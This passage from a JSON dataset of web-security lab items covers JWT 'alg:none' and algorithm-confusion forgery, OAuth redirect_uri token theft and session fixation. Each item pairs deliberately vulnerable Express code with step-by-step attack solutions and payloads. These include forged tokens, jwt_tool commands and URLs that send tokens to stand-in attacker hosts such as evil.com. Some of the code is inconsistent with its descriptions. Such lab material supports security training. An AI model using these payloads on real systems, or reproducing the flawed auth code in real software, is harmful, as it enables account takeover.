        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT from your session using Burp Suite and examine the header and payload.",
          "Confirm the server uses 'HS256' by default but does not reject 'none' as a signing algorithm.",
          "Modify the JWT header to: {\"alg\":\"none\",\"typ\":\"JWT\"} and change the payload to {\"username\":\"admin\"}.",
          "Remove the signature completely and use Postman to send the modified token in the Authorization header.",
          "Send GET request to /admin/dashboard with forged JWT and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Token error'); req.user = user; next(); }); }); app.get('/admin/dashboard', (req, res) => { if (req.user.username !== 'admin') return res.status(403).send('Unauthorized'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass lab on http://localhost:3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect and token hijack in third-party flow",
        "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate the redirect_uri parameter. Attackers can craft a malicious link to steal access tokens. To solve: Capture Carlos's OAuth token and access his profile using the stolen token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to analyze the OAuth login request and identify the vulnerable redirect_uri parameter.",
          "Craft a phishing link that sends the token response to a controlled domain (e.g. https://evil.com/callback).",
          "Simulate clicking the crafted OAuth URL using a browser to confirm the token leaks to your endpoint.",
          "Retrieve the access_token sent to your attacker server from the URL fragment.",
          "Use Postman to replay the token to the /profile endpoint via Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const tokens = {}; app.get('/oauth/callback', (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing params');  request.post({ url: 'https://oauth-server/token', form: { code, redirect_uri } }, (err, resp, body) => { const token = JSON.parse(body).access_token; tokens[redirect_uri] = token; res.redirect(redirect_uri + '?access_token=' + token); }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === tokens['https://evil.com/callback']) return res.send('Profile of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect lab on http://localhost:4000'));",
        "payloads": [
          "https://vulnerable.app/oauth/callback?code=xyz&redirect_uri=https://evil.com/callback",
          "https://vulnerable.app/oauth/callback?code=abc&redirect_uri=https://attacker.net/steal"
        ]
      },
      {
        "Lab scenario": "Session fixation in login workflow with predictable session ID",
        "Lab Description": "The application does not regenerate session tokens upon login. This allows attackers to set a session ID before authentication and hijack the session post-login. To solve: Fixate a session for Carlos, then reuse it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate a session while logged out and intercept the Set-Cookie header to capture a session ID.",
          "Send the session cookie to Carlos via a phishing page that sets document.cookie manually.",
          "Have Carlos log in using that session by simulating browser behavior or CSRF lure.",
          "Re-use the same session cookie in your browser and access /account.",
          "Verify that you're logged in as Carlos and access his account dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); const users = { carlos: 'hunter2' }; const sessions = {}; app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.cookies.sid || (Math.random().toString(36).substring(7)); res.cookie('sid', sid); req.sid = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.sid] = username; res.redirect('/account'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome, ${user}`); }); app.listen(5000, () => console.log('Session Fixation lab running on http://localhost:5000'));",
        "payloads": [
          "sid=abc123 (sent before login, reused after login by victim)",
          "document.cookie='sid=abc123'; window.location='https://vulnerable.app/login'"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session identifier in cookie",
        "Lab Description": "This lab demonstrates a session fixation vulnerability where session identifiers are accepted from the user. The application does not regenerate session tokens upon login. To solve: Fix a session ID, force the victim to authenticate using that session, and access their My account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a GET request to /login and observe the Set-Cookie header.",
          "2. Modify the cookie to a custom value (e.g., session=attacker123) and reload the login page.",
          "3. Share the crafted login link with the victim (e.g., via email or open redirect) to force login with the fixed session.",
          "4. Once victim logs in, reuse the session=attacker123 cookie to access /my-account as the victim.",
          "5. Confirm access to the victim's account page to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest'; sessions[sessId] = { loggedIn: false }; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessId) { sessions[sessId] = { loggedIn: true, username }; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessId = req.cookies.session; const session = sessions[sessId]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "session=attacker123",
          "session=fixatedtoken",
          "session=xyz987"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'alg':'none' bypass",
        "Lab Description": "The application uses JWT for user authentication but fails to validate the signature when the algorithm is set to 'none'. The backend incorrectly trusts JWT tokens regardless of signature when alg is 'none'. To solve: Forge an admin JWT and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite or Postman to capture a JWT-authenticated request after login.",
          "2. Decode the JWT using jwt.io and observe the structure and claims.",
          "3. Modify the 'alg' field to 'none' and change the payload's 'role' claim to 'admin'.",
          "4. Remove the signature portion and reassemble the JWT with only the header and payload.",
          "5. Use the forged token in the Authorization header to access /admin and confirm success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "JWT with 'alg':'none' and no signature",
          "Base64(header) + '.' + Base64(payload) + '.'"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allowing code injection via open redirect",
        "Lab Description": "The application uses a third-party OAuth provider for authentication but lacks proper redirect_uri validation. An attacker can inject a malicious redirect URI to intercept the authorization code. To solve: Capture a valid authorization code issued to the victim and use it to log in as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to map the login flow and identify the redirect_uri parameter in the OAuth flow.",
          "2. Modify the redirect_uri to point to your own server that captures query parameters.",
          "3. Craft a phishing link using the malicious redirect_uri and send it to the victim.",
          "4. Once the victim authorizes access, capture the authorization code from the query string.",
          "5. Use Postman to send a request to the token endpoint with the captured code and log in as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirectUri = req.query.redirect_uri; const state = 'xyz'; const authUrl = `https://oauth.example.com/auth?response_type=code&client_id=123&redirect_uri=${redirectUri}&state=${state}`; res.redirect(authUrl); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth.example.com/token', { code, client_id: '123', client_secret: 'secret', redirect_uri: 'http://vulnerable-app.com/callback' }); if (tokenRes.data.access_token) res.send('Login successful'); else res.send('Login failed'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
        "payloads": [
          "redirect_uri=http://attacker.com/intercept?code=",
          "https://vulnerable-app.com/login?redirect_uri=http://evil.com/capture",
          "https://oauth.example.com/auth?client_id=123&redirect_uri=http://attacker.site/log&response_type=code"
        ]
      },
      {
        "Lab scenario": "JWT tampering via none algorithm in login API",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly validates the token's signature algorithm. The login endpoint issues a signed JWT that includes user roles. However, the server accepts tokens with 'alg':'none' without signature verification. To solve: escalate privileges by tampering with the JWT and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture the JWT issued upon successful login using Burp Suite.",
          "2. Decode the JWT using jwt.io or a local script and note the algorithm and user role.",
          "3. Modify the JWT header to use \"alg\":\"none\" and change the payload role to \"admin\".",
          "4. Reconstruct the JWT without a signature and replace the Authorization header in Burp.",
          "5. Send a GET request to /admin-panel and verify access is granted using the tampered token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'user', password: 'pass', role: 'user' }]; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin access granted'); res.status(403).send('Forbidden'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "{\"alg\":\"none\"} + {\"username\":\"carlos\",\"role\":\"admin\"}",
          "JWT with base64-encoded header.payload and no signature"
        ]
      },
      {
        "Lab scenario": "Session fixation via static session ID assignment",
        "Lab Description": "The application assigns session identifiers before authentication and fails to regenerate the session ID after login. This allows an attacker to fix a known session ID and force a victim to use it, enabling full session hijacking after login. To solve: log the victim in using the fixed session and access their profile page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Visit the application and capture the Set-Cookie header using OWASP ZAP.",
          "2. Note that the session ID remains the same pre- and post-login.",
          "3. Generate a malicious login link embedding a known session ID (e.g., using a hidden iframe).",
          "4. Trick the victim into logging in with this fixed session via phishing or social engineering.",
          "5. Use the known session ID to access /profile while impersonating the victim after login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); req.session.user = username; res.redirect('/profile'); }); app.get('/profile', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on http://localhost:3000'));",
        "payloads": [
          "Use preset session cookie: sessionId=knownSessionID",
          "Malicious link: http://target-app/login with crafted cookie header",
          "Force session: document.cookie = 'connect.sid=knownSessionID'"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allowing token reuse across clients",
        "Lab Description": "The app integrates with an external OAuth provider but does not restrict token audience. As a result, access tokens issued for one client (mobile app) can be reused on the web client. To solve: intercept a token issued to another client and reuse it on the vulnerable web interface to access user info.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to proxy traffic from the mobile app emulator (or inspect API calls).",
          "2. Capture an OAuth access token issued to the mobile client during login flow.",
          "3. Observe the token lacks 'aud' or 'azp' checks on the server side.",
          "4. Send the token to the web client's /user-info endpoint via Postman.",
          "5. Receive unauthorized access to a web user profile using the reused token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, name: 'carlos', email: 'carlos@domain.com' }]; const oauthPublicKey = 'public-oauth-key'; app.post('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, oauthPublicKey, { algorithms: ['RS256'], ignoreExpiration: false }); const user = users.find(u => u.email === decoded.email); if (user) return res.json(user); res.status(404).send('User not found'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('OAuth Token Reuse Lab running on http://localhost:3000'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
          "Use mobile-issued access token on /user-info endpoint",
          "Token with mismatched audience field used in web flow"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in authorization header",
        "Lab Description": "The application implements JWT-based authentication using the RS256 algorithm, but fails to properly validate the algorithm header, allowing algorithm substitution attacks. The application accepts JWT tokens in the Authorization header to access protected resources. To solve: forge a valid JWT token with admin privileges and access the /admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT and decode it using jwt.io or Burp Decoder.",
          "Observe that the 'alg' is set to RS256 but the server does not enforce key type during validation.",
          "Replace 'alg' with HS256 and use the public RSA key as the HMAC secret to re-sign the token using a tool like jwt_tool or CyberChef.",
          "Modify the payload to include { \"role\": \"admin\" } and sign it using HS256 and the public key.",
          "Send a request with the forged JWT in the Authorization header to /admin and verify access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const PUBLIC_KEY = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.role === 'admin') { return res.send('Welcome Admin'); } res.status(403).send('Not authorized'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" } signed with public key as HMAC",
          "jwt_tool token.jwt -X -a HS256 -s public.pem -p '{\"role\":\"admin\"}'"
        ]
      },
      {
        "Lab scenario": "Session fixation via unvalidated session token reuse",
        "Lab Description": "The application sets a session cookie before login but fails to generate a new session upon authentication, making it vulnerable to session fixation. The session ID is stored in a cookie named 'sessionid'. To solve: fix a session before login, force the victim to log in, and reuse their session to access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP or Burp Suite to capture a GET /login request and obtain a pre-auth sessionid cookie.",
          "Send the crafted login link to the victim with the sessionid set via a cookie or URL parameter.",
          "Wait until the victim logs in and their account is bound to the fixed session.",
          "Replay the sessionid cookie in a GET /account request.",
          "Access the account dashboard and confirm it belongs to the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': 'password123' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Welcome ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
        "payloads": [
          "Set-Cookie: sessionid=fixed123; path=/",
          "https://example.com/login?sessionid=fixed123",
          "GET /account with Cookie: sessionid=fixed123 after victim logs in"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leak via referrer header",
        "Lab Description": "The application uses the OAuth 2.0 implicit grant flow for authentication but redirects users to a third-party domain while retaining the access token in the URL fragment. This results in the token being leaked via the Referer header. To solve: steal the victim's access token and use it to retrieve their profile information.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a malicious site or Burp Collaborator endpoint to collect Referer headers.",
          "Send a crafted phishing link to the victim: https://vuln-app.com/callback#access_token=xyz123...",
          "Ensure the application redirects to a malicious domain like https://attacker.com/log",
          "Capture the full Referer containing the access_token using the Collaborator payload.",
          "Replay the token in an Authorization header to GET /api/userinfo and extract the user's email."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'xyz123': 'carlos@example.com' }; app.get('/callback', (req, res) => { res.redirect('https://attacker.com/log'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (accessTokens[token]) { res.send(`Email: ${accessTokens[token]}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "https://vuln-app.com/callback#access_token=xyz123",
          "GET /api/userinfo with Authorization: Bearer xyz123",
          "Referer: https://vuln-app.com/callback#access_token=xyz123 sent to https://attacker.com/log"
        ]
      },
      {
        "Lab scenario": "Session Fixation in Login Flow",
        "Lab Description": "The application uses a custom session mechanism without regenerating session IDs after login. The application issues a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID, get the victim to use it, then hijack their session to access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept GET /login and note issued session ID in Set-Cookie",
          "Send victim a phishing link with the fixated session ID in a pre-authenticated cookie",
          "Wait until the victim logs in with the attacker-provided session",
          "Reuse the same session ID in attackerâ€™s browser after victim login",
          "Access /dashboard using the fixated session ID to confirm hijack"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].authenticated = true; sessions[sid].username = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.authenticated) res.send('Welcome ' + session.username); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "GET /login (extract Set-Cookie: session=XYZ)",
          "Set-Cookie: session=XYZ (in victim's browser)",
          "Use session=XYZ post victim-login to access /dashboard"
        ]
      },
      {
        "Lab scenario": "JWT Tampering using 'none' Algorithm",
        "Lab Description": "The application trusts JWTs signed with the 'none' algorithm and does not validate their integrity. The JWT is used for session authentication. To solve: Forge an admin token with 'none' as algorithm and escalate privileges.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in and extract JWT token from /auth/login response",
          "Decode JWT at jwt.io and note payload/alg",
          "Modify JWT payload to {\"username\":\"admin\",\"role\":\"admin\"}, set alg to 'none'",
          "Remove signature and re-encode token",
          "Use Burp to inject forged token into Authorization header and access /admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'rootpass', role: 'admin' }]; app.post('/auth/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
        "payloads": [
          "JWT: {\"alg\":\"none\",\"typ\":\"JWT\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
          "Authorization: Bearer [forged_token]",
          "jwt.io or jwt-tool to manipulate header/payload"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Token Exchange Flow",
        "Lab Description": "The application integrates with an OAuth provider but does not validate the audience (aud) field in the ID token. This allows a malicious app to reuse a token issued for another client. To solve: Use an ID token issued to another client to access protected resources.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Postman to authorize using attacker-controlled OAuth client",
          "Obtain a valid ID token from the provider using /oauth/token",
          "Replay the ID token to the target app at /auth/callback",
          "The app fails to validate aud field and accepts the token",
          "Access /user/profile to confirm account takeover"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const axios = require('axios'); const app = express(); app.use(express.json()); app.post('/auth/callback', async (req, res) => { const { id_token } = req.body; try { const decoded = jwt.decode(id_token); if (!decoded) return res.status(401).send('Invalid token');  req.session = { user: decoded.email }; res.send('Logged in as ' + decoded.email); } catch (err) { res.status(400).send('Token error'); } }); app.get('/user/profile', (req, res) => { if (!req.session) return res.status(401).send('Not logged in'); res.send('Profile of ' + req.session.user); }); app.listen(5000);",
        "payloads": [
          "Valid ID token from attacker-client with aud=attacker-app",
          "Replay token to /auth/callback of victim app",
          "Decoded payload: {\"email\":\"victim@example.com\",\"aud\":\"attacker-app\"}"
        ]
      },
      {
        "Lab scenario": "Session Fixation in Cookie-Based Login Flow",
        "Lab Description": "The application fails to regenerate session identifiers upon successful login. As a result, an attacker can set a session ID before authentication and reuse it post-login. The application assigns session IDs via cookies before authentication, and fails to issue a new one after. To solve: log in as Carlos using a session fixation attack.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept initial GET /login request using Burp Suite and capture Set-Cookie: sessionId.",
          "Send sessionId=attacker-session in a GET /login request and observe it's accepted unauthenticated.",
          "Craft a phishing email with a link containing the pre-defined session ID and send it to Carlos.",
          "Carlos logs in, binding the fixed session ID to his authenticated session.",
          "Reuse the same sessionId in a new browser session to access /my-account and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionId) { const sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (sessions[req.cookies.sessionId]?.authenticated) { res.send('Account: carlos'); } else { res.status(403).send('Forbidden'); } });",
        "payloads": [
          "Cookie: sessionId=attacker-session",
          "Set sessionId via phishing link, e.g., /login with Cookie: sessionId=attacker-session",
          "Reuse: Cookie: sessionId=attacker-session after Carlos logs in"
        ]
      },
      {
        "Lab scenario": "JWT Tampering in Authorization Header",
        "Lab Description": "The application uses JWTs for session management but fails to validate the algorithm properly. It accepts unsigned tokens if the 'alg' is set to 'none'. To solve: forge a JWT for Carlos and access the protected account page without knowing the secret.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Log in as any user and capture the JWT in Authorization: Bearer header using Burp Suite.",
          "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header set to 'HS256'.",
          "Create a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}.",
          "Remove the signature part and reassemble the JWT.",
          "Send the forged JWT in Authorization: Bearer <token> to /my-account and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === '123') { const token = jwt.sign({ username: 'carlos' }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') res.send('Account: carlos'); else res.status(403).send('Forbidden'); } catch (e) { res.status(400).send('Invalid token'); } });",
        "payloads": [
          "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
          "Authorization: Bearer <base64(header)>.base64(payload).",
          "Tool: jwt_tool -t jwt -X alg_none -pc '{\"username\":\"carlos\"}'"
        ]
      },
      {
        "Lab scenario": "OAuth Token Leakage in Redirect URI",
        "Lab Description": "The application uses OAuth with an implicit grant flow that leaks access tokens via a redirection URI susceptible to open redirect. This allows attackers to harvest tokens if the user authorizes the app. To solve: steal Carlos's OAuth token and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Inspect the OAuth login flow and identify the redirection URI pattern using OWASP ZAP.",
          "Craft an authorization request with a malicious redirect_uri (e.g., attacker.com/steal-token).",
          "Send the phishing link to Carlos and wait for him to authorize the app.",
          "Capture the token in the fragment portion of the redirected URL.",
          "Replay the token in Authorization: Bearer <token> to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); const users = [{ username: 'carlos' }]; const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('token-carlos').toString('base64'); tokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.send('OAuth access to carlos'); } else { res.status(403).send('Forbidden'); } });",
        "payloads": [
          "GET /auth?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/steal-token",
          "Captured URL fragment: #access_token=encoded-token&token_type=bearer",
          "Authorization: Bearer token-carlos (decoded)"
        ]
      },
      {
        "Lab scenario": "OAuth login session fixation in third-party auth flow",
        "Lab Description": "The OAuth login implementation in this app fails to issue a new session ID after authentication. The application reuses session cookies from unauthenticated requests. To solve: force a victim to authenticate with a session you control and gain access to their authenticated session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept OAuth login flow using Burp Suite's Proxy while initiating login via 'Login with GitHub'.",
          "Confirm that session cookie remains the same before and after authentication.",
          "Craft a malicious OAuth login URL and send to the victim (phishing or social engineering) while reusing the session cookie.",
          "After victim logs in, use the original session cookie from your browser to access their authenticated session.",
          "Verify successful takeover by navigating to /my-account and seeing the victim's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const passport = require('passport'); const GitHubStrategy = require('passport-github2').Strategy; app.use(session({ secret: 'vuln-session', resave: true, saveUninitialized: true })); app.use(passport.initialize()); app.use(passport.session()); passport.use(new GitHubStrategy({ clientID: 'GITHUB_ID', clientSecret: 'GITHUB_SECRET', callbackURL: '/auth/github/callback' }, (accessToken, refreshToken, profile, done) => { return done(null, profile); })); app.get('/auth/github', passport.authenticate('github')); app.get('/auth/github/callback', passport.authenticate('github', { failureRedirect: '/' }), (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { res.send('Welcome ' + req.user.username); }); app.listen(4000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "Set sessionid=attacker-session before auth redirect",
          "Send GitHub OAuth link to victim with attackerâ€™s session cookie",
          "Access /my-account using same cookie after victim login"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'alg=none'",
